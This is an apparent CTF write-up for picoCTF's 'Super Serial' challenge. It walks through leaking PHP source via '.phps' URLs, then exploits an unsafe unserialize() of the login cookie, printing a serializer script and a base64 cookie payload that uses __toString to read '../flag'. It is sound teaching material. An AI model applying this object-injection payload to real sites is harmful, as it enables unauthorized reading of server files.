<hr />

<h2>description: PHP object injection (deserialization vulnerability)</h2>

<h1>Super Serial (130)</h1>

<h2>Problem</h2>

<p>Try to recover the flag stored on this website </p>

<p>{% embed url="http://mercury.picoctf.net:3449/" %}</p>

<h2>Solution</h2>

<p>If we go over to the robots.txt file, we can see that there is a page called <code>/admin.phps</code></p>

<p><img src="../../.gitbook/assets/396f8c4c29ae4cc2bafc73c0bd2dd65d.png" alt="" /></p>

<p>Navigating there, however, gives a Not Found error.</p>

<p>But if we navigate to <code>http://mercury.picoctf.net:3449/index.phps</code> (append <code>s</code> to the index page), we get the source code for <code>index.php</code> (I guess <code>s</code> stands for source?)</p>

<p>```php
<?php
require_once("cookie.php");</p>

<p>if(isset($<em>POST["user"]) &amp;&amp; isset($</em>POST["pass"])){
    $con = new SQLite3("../users.db");
    $username = $<em>POST["user"];
    $password = $</em>POST["pass"];
    $perm<em>res = new permissions($username, $password);
    if ($perm</em>res->is<em>guest() || $perm</em>res->is<em>admin()) {
        setcookie("login", urlencode(base64</em>encode(serialize($perm_res))), time() + (86400 * 30), "/");
        header("Location: authentication.php");
        die();
    } else {
        $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
    }
}
?>
```</p>

<p>This reveals another page, <code>authentication.php</code>.</p>

<p>Similarly, we can view the source code by appending the <code>s</code>.</p>

<p>```php
<?php</p>

<p>class access<em>log
{
    public $log</em>file;</p>

<pre><code>function __construct($lf) {
    $this-&gt;log_file = $lf;
}

function __toString() {
    return $this-&gt;read_log();
}

function append_to_log($data) {
    file_put_contents($this-&gt;log_file, $data, FILE_APPEND);
}

function read_log() {
    return file_get_contents($this-&gt;log_file);
}
</code></pre>

<p>}</p>

<p>require<em>once("cookie.php");
if(isset($perm) &amp;&amp; $perm->is</em>admin()){
    $msg = "Welcome admin";
    $log = new access<em>log("access.log");
    $log->append</em>to_log("Logged in at ".date("Y-m-d")."\n");
} else {
    $msg = "Welcome guest";
}
?>
```</p>

<p>Finally, the <code>require_once()</code> includes the <code>cookie.php</code> file. Let's view the source code:</p>

<p>```php
<?php
session_start();</p>

<p>class permissions
{
    public $username;
    public $password;</p>

<pre><code>function __construct($u, $p) {
    $this-&gt;username = $u;
    $this-&gt;password = $p;
}

function __toString() {
    return $u.$p;
}

function is_guest() {
    $guest = false;

    $con = new SQLite3("../users.db");
    $username = $this-&gt;username;
    $password = $this-&gt;password;
    $stm = $con-&gt;prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
    $stm-&gt;bindValue(1, $username, SQLITE3_TEXT);
    $stm-&gt;bindValue(2, $password, SQLITE3_TEXT);
    $res = $stm-&gt;execute();
    $rest = $res-&gt;fetchArray();
    if($rest["username"]) {
        if ($rest["admin"] != 1) {
            $guest = true;
        }
    }
    return $guest;
}

    function is_admin() {
            $admin = false;

            $con = new SQLite3("../users.db");
            $username = $this-&gt;username;
            $password = $this-&gt;password;
            $stm = $con-&gt;prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
            $stm-&gt;bindValue(1, $username, SQLITE3_TEXT);
            $stm-&gt;bindValue(2, $password, SQLITE3_TEXT);
            $res = $stm-&gt;execute();
            $rest = $res-&gt;fetchArray();
            if($rest["username"]) {
                    if ($rest["admin"] == 1) {
                            $admin = true;
                    }
            }
            return $admin;
    }
</code></pre>

<p>}</p>

<p>if(isset($<em>COOKIE["login"])){
    try{
        $perm = unserialize(base64</em>decode(urldecode($<em>COOKIE["login"])));
        $g = $perm->is</em>guest();
        $a = $perm->is_admin();
    }
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
}</p>

<p>?>
```</p>

<h3>Exploit</h3>

<p>OK. A few things to note here. The cookie.php file is included in every page. The following code segment will deserialize our cookie and print the object when an error occurs. (<code>"Deserialization error. ".$perm</code>)</p>

<p><code>php
if(isset($_COOKIE["login"])){
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm-&gt;is_guest();
        $a = $perm-&gt;is_admin();
    }
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
}
</code></p>

<p>Conveniently, the <code>access_log</code> class in authentication.php has the following <code>__toString()</code> method:</p>

<p>```php
    function <em>_toString() {
        return $this->read</em>log();
    }</p>

<pre><code>function append_to_log($data) {
    file_put_contents($this-&gt;log_file, $data, FILE_APPEND);
}

function read_log() {
    return file_get_contents($this-&gt;log_file);
}
</code></pre>

<p>```</p>

<p><code>__toString</code> is one of the PHP magic methods that override PHP's default behaviour. This method is called when the object is converted to a string. So if we could get the above <code>$perm</code> variable to be our custom <code>access_log</code> object, we could achieve arbitrary file read on the target system.</p>

<p>To do this, we simply serialize our custom <code>access_log</code> object, where we set <code>log_file</code> to <code>../flag</code>.</p>

<p>This can be done with the following script:</p>

<p>```php
<?php </p>

<pre><code>class access_log
{
    public $log_file;

    function __construct($lf) {
        $this-&gt;log_file = $lf;
    }

    function __toString() {
        return $this-&gt;read_log();
    }

    function append_to_log($data) {
        file_put_contents($this-&gt;log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this-&gt;log_file);
    }
}

class permissions
{
public $username;
public $password;

    function __construct($u, $p) {
        $this-&gt;username = $u;
        $this-&gt;password = $p;
    }

    function __toString() {
        return $u.$p;
    }
}

$serialized = serialize(new access_log('../flag'));
$encoded = urlencode(base64_encode($serialized));

var_dump($encoded);

$perm = unserialize(base64_decode(urldecode($encoded)));

var_dump($perm);
</code></pre>

<p>?>
```</p>

<p><img src="../../.gitbook/assets/25f16232c17c40ad9c40b864c27ad9a9.png" alt="" /></p>

<p>Now, we add <code>TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</code> as the <code>login</code> cookie on our browser and go to <code>authentication.php</code>. Note that we need to use <code>authentication.php</code> because that is the file where the required <code>access_log</code> class is defined.</p>

<p>Now back to this code:</p>

<p><code>php
if(isset($_COOKIE["login"])){
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
</code></p>

<p>Our custom <code>access_log('../flag')</code> object will be deserialized into <code>$perm</code>.</p>

<p><code>php
        $g = $perm-&gt;is_guest();
        $a = $perm-&gt;is_admin();
    }
</code></p>

<p>This will most definitely generate an error because the <code>access_log</code> class has no such methods.</p>

<p><code>php
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
}
</code></p>

<p>This will catch the error and concatenate <code>$perm</code> to the <code>"Deserialization error. "</code> string. In doing so, <code>$perm</code> is converted to a string. This invokes the <code>__toString()</code> method which reads <code>../flag</code>!</p>

<p><img src="../../.gitbook/assets/e9dfbb6fbb074aec8ed422f970816920.png" alt="" /></p>

<p>The flag will be printed on our browser.</p>
